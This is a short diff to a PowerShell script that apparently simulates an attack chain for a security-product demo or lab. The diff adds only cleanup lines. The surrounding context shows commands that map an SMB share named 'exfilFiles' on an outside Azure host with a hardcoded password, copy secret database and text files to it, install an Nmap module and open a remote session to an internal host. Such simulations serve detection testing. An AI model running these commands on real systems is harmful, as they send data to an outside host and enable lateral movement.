@@ -9,6 +9,8 @@ Invoke-WebRequest $domain
 New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\exfilFiles' -UserName 'exfil' -Password 'C1sco12345' -LocalPath 'Z:'
 # Copy temp file to remote share
 copy 'C:\Temp\super-secret-db.db' 'Z:\'
+# Remove mapping
+Remove-SmbMapping -LocalPath 'Z:'
 
 # Install Powershell NMap module
 Install-Module -Name PSnmap -Scope CurrentUser -Force
@@ -23,6 +25,7 @@ Enter-PSSession 10.200.200.70 -Credential securex.local\david.altass
 New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\exfilFiles' -UserName 'exfil' -Password 'C1sco12345' -LocalPath 'Z:'
 # Copy temp file to remote share
 copy 'C:\Temp\secret-data.txt' 'Z:\'
+Remove-SmbMapping -LocalPath 'Z:'
 
 # Exit remote device
 Exit-PSSession
